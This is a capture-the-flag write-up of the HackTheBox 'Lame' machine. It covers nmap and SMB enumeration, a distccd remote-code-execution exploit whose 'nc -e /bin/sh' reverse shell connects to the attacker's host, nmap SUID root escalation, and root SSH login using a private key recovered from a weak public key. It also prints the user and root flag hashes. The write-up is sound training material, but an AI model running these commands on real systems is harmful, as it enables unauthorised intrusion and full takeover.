---
render_with_liquid: false
title: HackTheBox Writeup  Lame
date: 2023-09-25 21:09:10 +1400
tags: [hackthebox, nmap, linux, crackmapexec, smbclient, distccd, searchsploit, cve-2004-2687, suid, gtfobin, weak-ssh-key, oscp-like]
---



Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ writehosts htb '10.129.70.120 lame.htb hackthebox.gr LAME.hackthebox.gr'
+---------+--------+---------------+--------------------+
| PROFILE | STATUS |      IP       |       DOMAIN       |
+---------+--------+---------------+--------------------+
| htb     | on     | 10.129.70.120 | lame.htb           |
| htb     | on     | 10.129.70.120 | hackthebox.gr      |
| htb     | on     | 10.129.70.120 | LAME.hackthebox.gr |
+---------+--------+---------------+--------------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Mon Sep 25 21:09:10 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,139,445,3632 lame.htb
Nmap scan report for lame.htb (10.129.70.120)
Host is up, received user-set (0.14s latency).
Scanned at 2023-09-25 21:09:10 CST for 53s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  243de8      syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 28541/tcp): CLEAN (Timeout)
|   Check 2 (port 43665/tcp): CLEAN (Timeout)
|   Check 3 (port 17669/udp): CLEAN (Timeout)
|   Check 4 (port 13315/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-25T09:10:20-04:00
|_clock-skew: mean: 2h00m56s, deviation: 2h49m45s, median: 54s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Sep 25 21:10:03 2023 -- 1 IP address (1 host up) scanned in 53.19 seconds
```


## SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ cme smb lame.htb -u '' -p ''
SMB         10.129.70.120   445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
SMB         10.129.70.120   445    LAME             [+] hackthebox.gr\:
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ cme smb lame.htb -u '' -p '' --shares
SMB         10.129.70.120   445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
SMB         10.129.70.120   445    LAME             [+] hackthebox.gr\:
SMB         10.129.70.120   445    LAME             [*] Enumerated shares
SMB         10.129.70.120   445    LAME             Share           Permissions     Remark
SMB         10.129.70.120   445    LAME             -----           -----------     ------
SMB         10.129.70.120   445    LAME             print$                          Printer Drivers
SMB         10.129.70.120   445    LAME             tmp             READ,WRITE      oh noes!
SMB         10.129.70.120   445    LAME             opt
SMB         10.129.70.120   445    LAME             IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
SMB         10.129.70.120   445    LAME             ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))
```

Dump all files

```bash
mkdir -p loot/smb
cd loot/smb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame/loot/smb]
└─$ smbclient //lame.htb/tmp -U "%" -c 'mask ""; recurse ON; prompt OFF; mget *'
Try "help" to get a list of possible commands.
NT_STATUS_ACCESS_DENIED opening remote file \5605.jsvc_up
getting file \.X0-lock of size 11 as .X0-lock (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (3.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \vmware-root\*
NT_STATUS_ACCESS_DENIED opening remote file \.X11-unix\X0
```

^dab465

> Another way to dump smb share
> ```
> cme smb lame.htb -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE="52428800" OUTPUT_FOLDER=./loot/smb
> ```
{: .prompt-tip }

^26b386

Nothing interesting, can only view `vgauthsvclog.txt.0`

```bash
┌──(bravosec㉿fsociety)-[~/…/loot/smb/10.129.70.120/tmp]
└─$ cat vgauthsvclog.txt.0
[Sep 25 07:16:05.416] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Sep 25 07:16:05.416] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Sep 25 07:16:05.416] [ message] [VGAuthService] Group 'service'
...
```


# User Flag
---

## Shell as daemon


### Exploit distccd (CVE-2004-2687.py)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ searchsploit distcc
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DistCC Daemon - Command Execution (Metasploit)                                                                                                                                 | multiple/remote/9915.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Find python POC on the internet

> https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ wget https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/261b638bb05d02b67b6ad67fa9cf3c74a73de6c6/distccd_rce_CVE-2004-2687.py

┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ vi distccd_rce_CVE-2004-2687.py
```

![](/assets/obsidian/13be625e6363f8bbeb0253f2038bbed2.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ python ./distccd_rce_CVE-2004-2687.py -t lame.htb -p 3632 -c "nc -e /bin/sh 10.10.16.10 1111"
[OK] Connected to remote service
[KO] Exception Raised
```

Using **python3** won't work, needs **python2**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ python2 ./distccd_rce_CVE-2004-2687.py -t lame.htb -p 3632 -c "nc -e /bin/sh 10.10.16.10 1111"
[OK] Connected to remote service
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.70.135] 50302
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@lame:/tmp$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

daemon@lame:/tmp$ export TERM=xterm
daemon@lame:/tmp$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@lame:/tmp$ cat user.txt
cat: user.txt: No such file or directory
```

Get user flag

```bash
daemon@lame:/tmp$ cd /home
daemon@lame:/home$ find . -type f -ls
114692    4 -rw-r--r--   1 service  service       586 Apr 16  2010 ./service/.profile
114693    4 -rw-r--r--   1 service  service      2928 Apr 16  2010 ./service/.bashrc
114691    4 -rw-r--r--   1 service  service       220 Apr 16  2010 ./service/.bash_logout
114701    4 -rw-r--r--   1 makis    makis          33 Sep 25 11:14 ./makis/user.txt
114697    4 -rw-r--r--   1 makis    makis         586 Mar 14  2017 ./makis/.profile
114700    0 -rw-r--r--   1 makis    makis           0 Mar 14  2017 ./makis/.sudo_as_admin_successful
114696    4 -rw-------   1 makis    makis        1107 Mar 14  2017 ./makis/.bash_history
114698    4 -rw-r--r--   1 makis    makis        2928 Mar 14  2017 ./makis/.bashrc
114699    4 -rw-r--r--   1 makis    makis         220 Mar 14  2017 ./makis/.bash_logout
find: ./user/.ssh: Permission denied
131088    4 -rw-r--r--   1 1001     1001          586 Mar 31  2010 ./user/.profile
131093    4 -rw-------   1 1001     1001          165 May  7  2010 ./user/.bash_history
131089    4 -rw-r--r--   1 1001     1001         2928 Mar 31  2010 ./user/.bashrc
131087    4 -rw-r--r--   1 1001     1001          220 Mar 31  2010 ./user/.bash_logout
daemon@lame:/home$ cat ./makis/user.txt
68a371d65d409370efcc8c69954a6bba
```


# Root Flag
---

## From daemon to root


### Abuse SUID

```bash
daemon@lame:/home$ find / -type f -perm -4000 -ls 2>/dev/null &
...
344365   20 -rwsr-xr-x   1 root     root        19144 Apr  2  2008 /usr/bin/newgrp
344429   28 -rwsr-xr-x   1 root     root        28624 Apr  2  2008 /usr/bin/chfn
344956  768 -rwsr-xr-x   1 root     root       780676 Apr  8  2008 /usr/bin/nmap
...
```

> https://gtfobins.github.io/gtfobins/nmap/#shell

```bash
daemon@lame:/home$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
sh-3.2# cat /root/root.txt
7d1507d020b50f593ce023c9b2a7bc06
sh-3.2#
```


# Additional
---

## Failed Attempts


### FTP

Nothing in the ftp share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ ftp ftp://anonymous:''@lame.htb
Connected to lame.htb.
220 (vsFTPd 2.3.4)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls -la
229 Entering Extended Passive Mode (|||47015|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

Anonymous can't upload files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ touch test
```

```bash
ftp> put test
local: test remote: test
229 Entering Extended Passive Mode (|||23668|).
553 Could not create file.
ftp>
```

Failed to exploit `vsftpd 2.3.4 (CVE-2011-2523)`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ searchsploit -m 49757
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/Lame/49757.py
```

Exploit just halts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ source ~/venv-py3.8/bin/activate

┌──(venv-py3.8)─(bravosec㉿fsociety)-[~/htb/Lame]
└─$ python 49757.py lame.htb
```


## Privesc : Readable weak authorized_keys

> Recover private key from public key

```bash
daemon@lame:/tmp$ cd /root
daemon@lame:/root$ find . -type f -ls 2>/dev/null
 24701    8 -rw-------   1 root     root         7571 May 20  2012 ./.gstreamer-0.10/registry.i486.xml
 24588    4 -rwx------   1 root     root            4 May 20  2012 ./.rhosts
 24607    4 -rw-r--r--   1 root     root          118 Sep 25 11:45 ./vnc.log
 24606    4 -rw-r--r--   1 root     root          168 May 20  2012 ./.fluxbox/windowmenu
 24601    4 -rw-r--r--   1 root     root         2805 May 20  2012 ./.fluxbox/keys
 24603    4 -rw-r--r--   1 root     root           70 May 20  2012 ./.fluxbox/apps
 24600    4 -rw-r--r--   1 root     root          504 May 20  2012 ./.fluxbox/startup
 24605    4 -rw-r--r--   1 root     root          314 May 20  2012 ./.fluxbox/init
 24735    4 -rw-r--r--   1 root     root          142 Sep 25 11:45 ./.fluxbox/lastwallpaper
 24604    4 -rw-r--r--   1 root     root           89 May 20  2012 ./.fluxbox/overlay
 24602    4 -rw-r--r--   1 root     root           66 May 20  2012 ./.fluxbox/menu
 24579    4 -rw-r--r--   1 root     root          442 May 20  2012 ./.ssh/known_hosts
 24587    4 -rw-r--r--   1 root     root          405 May 17  2010 ./.ssh/authorized_keys
 24581    4 -rw-r--r--   1 root     root          141 Oct 20  2007 ./.profile
 24732    4 -rwx------   1 root     root          401 May 20  2012 ./reset_logs.sh
 24595    4 -rw-------   1 root     root          373 Sep 25 11:45 ./.Xauthority
 24609    4 -rw-------   1 root     root           33 Sep 25 11:46 ./root.txt
 24582    4 -rw-r--r--   1 root     root         2227 Oct 20  2007 ./.bashrc
```

Public keys file is readable @@

```bash
daemon@lame:/root$ cat ./.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
```

Can simply google reverse search for the private key

> [RsaCTFTool](https://github.com/RsaCtfTool/RsaCtfTool) is another tool to test weak ssh public keys
> ```bash
> ┌──(bravosec㉿fsociety)-[/opt/sectools/ctf/RsaCtfTool]
> └─$ python RsaCtfTool.py --publickey $PUBKEY_FILE --private
> ```
{: .prompt-tip }

![](/assets/obsidian/71a6335a83ea9a89d5e79f1fc070196e.png)

> https://charlesreid1.com/wiki/Metasploitable/VSFTP

![](/assets/obsidian/eec2d7eec3d54461aa25c506e7d90d1b.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ vi root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ ssh -i root.id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@lame.htb
Last login: Mon Sep 25 11:45:43 2023 from :0.0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~# id
uid=0(root) gid=0(root) groups=0(root)
```


## Fix SSH Issue

```bash
┌──(bravosec㉿fsociety)-[~/htb/Lame]
└─$ ssh root@lame.htb
Unable to negotiate with 10.129.70.120 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

Fix :

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@lame.htb
```